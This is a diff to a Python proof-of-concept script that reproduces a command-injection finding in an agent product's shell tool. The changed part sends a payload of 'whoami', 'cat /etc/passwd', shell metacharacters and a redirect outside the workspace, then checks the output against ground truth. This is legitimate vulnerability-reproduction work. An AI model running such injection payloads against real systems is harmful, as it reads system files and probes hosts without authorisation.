@@ -12,7 +12,8 @@ This script checks the three links of that chain and prints PASS/FAIL for each:
   A. wiring       - which shipped agent modules ask for shell=True
   B. implementation - what run_shell actually calls (from shipped bytecode)
   C. execution    - the shipped tool, registered the way the product registers
-                    it, running a shell-metacharacter payload on this host
+                    it, running `whoami` and `cat /etc/passwd` (plus a redirect
+                    outside the workspace) as the scanner's own user on this host
 
 It executes shipped product code and a shell command (the same harmless
 marker-file payload as poc/05). Read it before running it. Run it through the
@@ -29,6 +30,7 @@ import importlib
 import marshal
 import os
 import pathlib
+import pwd
 import sys
 import types
 
@@ -221,24 +223,57 @@ def check_execution(extract, pyz):
     marker = os.path.join("/tmp", "pockit-f01-%d.proof" % os.getpid())
     if os.path.exists(marker):
         os.unlink(marker)
-    payload = ("pwd; echo metachar-proof; echo uid=$(id -u); "
+
+    # The command-injection payload a tester reaches for first: identify the
+    # account the shell runs as, read the account file, then show that the
+    # string was interpreted by a shell (format + arithmetic) and that a
+    # redirect lands outside the workspace.
+    payload = ("echo '=== whoami ==='; whoami; "
+               "echo '=== pwd ==='; pwd; "
+               "echo '=== cat /etc/passwd ==='; cat /etc/passwd; "
+               "echo '=== shell metacharacters ==='; "
                "printf 'A%s' 'B'; echo $((6*7)); "
                "echo POC > " + marker)
-    print("   payload  : %s" % payload)
+    print("   payload  : %s\n" % payload)
     out = run_shell(payload)
-    print("   --- tool output ---")
+    print("   --- tool output (what the agent receives) ---")
     for line in (out or "").splitlines():
         print("   | %s" % line)
     print("   --- end ---")
 
+    # Ground truth, read by this script without going through the shell.
+    me = pwd.getpwuid(os.getuid()).pw_name
+    try:
+        pw_lines = pathlib.Path("/etc/passwd").read_text(errors="replace").splitlines()
+    except OSError as exc:
+        pw_lines = []
+        print("   (cannot read /etc/passwd directly: %s)" % exc)
+
+    sections, current = {}, None
+    for line in (out or "").splitlines():
+        if line.startswith("=== ") and line.endswith(" ==="):
+            current = line[4:-4]
+            sections[current] = []
+        elif current is not None:
+            sections[current].append(line)
+    whoami = sections.get("whoami", [])
+    cwd = sections.get("pwd", [])
+    passwd = sections.get("cat /etc/passwd", [])
+    meta = sections.get("shell metacharacters", [])
+
     checks = {
-        "cwd is the workspace": workspace in (out or ""),
-        "metacharacters interpreted (; $( ) $(( )) %)": "metachar-proof" in (out or "")
-        and "uid=%d" % os.getuid() in (out or "") and "42" in (out or ""),
-        "printf format applied": "AB" in (out or ""),
+        "shell ran as this process's user (whoami == %s)" % me: whoami[:1] == [me],
+        "cat /etc/passwd returned the file: %d lines, identical to what this "
+        "script read" % len(pw_lines): bool(pw_lines) and passwd == pw_lines,
+        "metacharacters interpreted (printf format + $(()) arithmetic)":
+            meta[:1] == ["AB42"],
+        "working directory is the PoCKit workspace (pwd == %s)" % workspace:
+            bool(cwd) and os.path.realpath(cwd[0]) == os.path.realpath(workspace),
         "file written outside the workspace": os.path.exists(marker),
+        "redirect landed on /tmp, not inside the workspace": os.path.exists(marker)
+            and not os.path.exists(os.path.join(workspace, os.path.basename(marker))),
         "written by this process's uid": os.path.exists(marker)
-        and os.stat(marker).st_uid == os.getuid(),
+            and os.stat(marker).st_uid == os.getuid(),
     }
     for name, ok in checks.items():
         print("   %s %s" % ("PASS" if ok else "FAIL", name))
@@ -271,6 +306,12 @@ def main():
         print("   %s %s" % ("PASS" if ok else "FAIL", label))
     print("   F-01 reproduced: %d/3" % sum(1 for r in results if r))
     print("""
+   Check C runs the two commands a tester uses to prove command injection -
+   `whoami` and `cat /etc/passwd` - and compares both against what this script
+   read directly, so the tool's output is verified, not just displayed. Both are
+   read-only and harmless: /etc/passwd is world-readable and holds no credential
+   material on a modern system (/etc/shadow does, and is not touched here).
+
    What this shows: the shipped code hands a shell tool to three PoCKit agents,
    and that tool executes attacker-shaped command strings on the host with shell
    semantics - no container boundary is crossed because no container is used.
